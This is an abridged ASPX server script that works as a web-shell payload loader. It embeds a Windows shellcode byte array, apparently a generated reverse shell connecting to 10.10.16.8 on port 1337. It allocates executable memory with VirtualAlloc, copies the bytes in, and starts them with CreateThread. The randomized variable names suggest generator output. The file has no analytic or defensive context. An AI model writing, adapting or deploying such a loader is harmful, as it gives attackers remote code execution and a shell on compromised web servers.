...
<script runat="server">
    ...
    {
        byte[] sO2jxI = new byte[354] {0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,
...
0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x0a,0x10,0x08,
0x68,0x02,0x00,0x05,0x39,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xd5};
        ...
        IntPtr yyEmH_Xyl7 = VirtualAlloc(IntPtr.Zero,(UIntPtr)sO2jxI.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(sO2jxI,0,yyEmH_Xyl7,sO2jxI.Length);
        IntPtr oa4mk11 = IntPtr.Zero;
        IntPtr q60JfCH76VIg = CreateThread(IntPtr.Zero,UIntPtr.Zero,yyEmH_Xyl7,IntPtr.Zero,0,ref oa4mk11);
    }
</script>
